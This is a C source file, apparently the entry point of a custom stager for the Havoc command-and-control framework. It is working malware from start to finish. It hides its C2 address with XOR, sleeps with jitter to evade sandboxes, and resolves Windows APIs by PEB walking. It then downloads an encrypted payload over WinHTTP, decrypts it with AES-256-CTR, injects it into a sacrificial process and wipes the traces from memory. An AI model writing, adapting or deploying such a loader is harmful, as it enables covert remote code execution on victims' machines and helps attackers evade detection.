/*
 * Havoc Custom Stager — Main Entry Point
 *
 * Flow:
 *   1. Jitter sleep (sandbox evasion)
 *   2. Resolve all APIs via PEB walking
 *   3. Download encrypted payload from C2 via WinHTTP
 *   4. AES-256-CTR decrypt
 *   5. Inject into sacrificial process via section mapping
 *   6. Clean exit
 */

#include "stager.h"

/* ============================================
 * Embedded config (XOR obfuscated)
 * ============================================ */
static char cfg_host[]    = { '1'^0x55,'9'^0x55,'2'^0x55,'.'^0x55,'1'^0x55,'6'^0x55,'8'^0x55,'.'^0x55,'1'^0x55,'.'^0x55,'1'^0x55,'6'^0x55,'5'^0x55,0 };
static char cfg_path[]    = { '/'^0x55,'p'^0x55,'a'^0x55,'y'^0x55,'l'^0x55,'o'^0x55,'a'^0x55,'d'^0x55,0 };
static char cfg_ua[]      = { 'M'^0x55,'o'^0x55,'z'^0x55,'i'^0x55,'l'^0x55,'l'^0x55,'a'^0x55,'/'^0x55,'5'^0x55,'.'^0x55,'0'^0x55,0 };
static BYTE cfg_key[32]   = { 0x00 }; /* Filled at compile time by builder */
/* IV is prepended to downloaded payload */

#define XOR_KEY 0x55

static void deobf(char *s)
{
    while (*s) { *s ^= XOR_KEY; s++; }
}

/* ============================================
 * Download payload from C2 via WinHTTP
 * ============================================ */
BOOL DownloadPayload(PAPI_TABLE Api, PBYTE *ppPayload, PDWORD pdwSize)
{
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    WCHAR wHost[64] = {0}, wPath[64] = {0}, wUa[128] = {0};
    BYTE *pBuf = NULL;
    DWORD dwTotal = 0, dwRead = 0, dwBufSize = 4096;
    BOOL bResult = FALSE;
    int i;

    deobf(cfg_host);
    deobf(cfg_path);
    deobf(cfg_ua);

    /* Convert ANSI to WCHAR */
    for (i = 0; cfg_host[i] && i < 63; i++) wHost[i] = (WCHAR)cfg_host[i];
    for (i = 0; cfg_path[i] && i < 63; i++) wPath[i] = (WCHAR)cfg_path[i];
    for (i = 0; cfg_ua[i] && i < 127; i++) wUa[i] = (WCHAR)cfg_ua[i];

    /* Re-obfuscate strings in memory */
    deobf(cfg_host);
    deobf(cfg_path);
    deobf(cfg_ua);

    hSession = Api->WinHttpOpen(wUa, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    hConnect = Api->WinHttpConnect(hSession, wHost, (INTERNET_PORT)C2_PORT, 0);
    if (!hConnect) goto cleanup;

    hRequest = Api->WinHttpOpenRequest(hConnect, L"GET", wPath,
                                       NULL, WINHTTP_NO_REFERER,
                                       WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) goto cleanup;

    if (!Api->WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        goto cleanup;
    }

    if (!Api->WinHttpReceiveResponse(hRequest, NULL)) {
        goto cleanup;
    }

    /* Read response into dynamically grown buffer */
    pBuf = (BYTE*)Api->VirtualAlloc(NULL, PAYLOAD_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBuf) goto cleanup;

    while (dwTotal < PAYLOAD_SIZE) {
        dwRead = 0;
        if (!Api->WinHttpReadData(hRequest, pBuf + dwTotal, dwBufSize, &dwRead)) break;
        if (dwRead == 0) break;
        dwTotal += dwRead;
    }

    if (dwTotal > 0) {
        *ppPayload = pBuf;
        *pdwSize = dwTotal;
        bResult = TRUE;
    } else {
        Api->VirtualFree(pBuf, 0, MEM_RELEASE);
    }

cleanup:
    if (hRequest)  Api->WinHttpCloseHandle(hRequest);
    if (hConnect)  Api->WinHttpCloseHandle(hConnect);
    if (hSession)  Api->WinHttpCloseHandle(hSession);
    return bResult;
}

/* ============================================
 * Entry Point
 * ============================================ */
VOID StagerEntry(VOID)
{
    API_TABLE Api = {0};
    PBYTE pPayload = NULL;
    PBYTE pDecrypted = NULL;
    DWORD dwSize = 0;

    /* 1. Sandbox evasion: sleep 15-45s with jitter */
    if (!ResolveApis(&Api)) {
        Api.ExitProcess(1);
    }
    SleepJitter(&Api, 15000, 45000);

    /* 2. Resolve all APIs */
    if (!ResolveApis(&Api)) {
        Api.ExitProcess(1);
    }

    /* 3. Download encrypted payload */
    if (!DownloadPayload(&Api, &pPayload, &dwSize)) {
        Api.ExitProcess(1);
    }

    /* 4. Decrypt payload (skip 16-byte IV prefix) */
    if (dwSize <= 16) {
        Api.VirtualFree(pPayload, 0, MEM_RELEASE);
        Api.ExitProcess(1);
    }

    pDecrypted = (PBYTE)Api.VirtualAlloc(NULL, dwSize - 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDecrypted) {
        Api.VirtualFree(pPayload, 0, MEM_RELEASE);
        Api.ExitProcess(1);
    }

    Aes256CtrDecrypt(cfg_key, pPayload, pPayload + 16, dwSize - 16, pDecrypted);

    /* Overwrite encrypted buffer before freeing */
    for (DWORD i = 0; i < dwSize; i++) pPayload[i] = 0;
    Api.VirtualFree(pPayload, 0, MEM_RELEASE);

    /* 5. Inject decrypted payload into sacrificial process */
    if (!InjectSection(&Api, pDecrypted, dwSize - 16)) {
        for (DWORD i = 0; i < dwSize - 16; i++) pDecrypted[i] = 0;
        Api.VirtualFree(pDecrypted, 0, MEM_RELEASE);
        Api.ExitProcess(1);
    }

    /* 6. Wipe decrypted payload from memory */
    for (DWORD i = 0; i < dwSize - 16; i++) pDecrypted[i] = 0;
    Api.VirtualFree(pDecrypted, 0, MEM_RELEASE);

    /* 7. Clean exit */
    Api.ExitProcess(0);
}
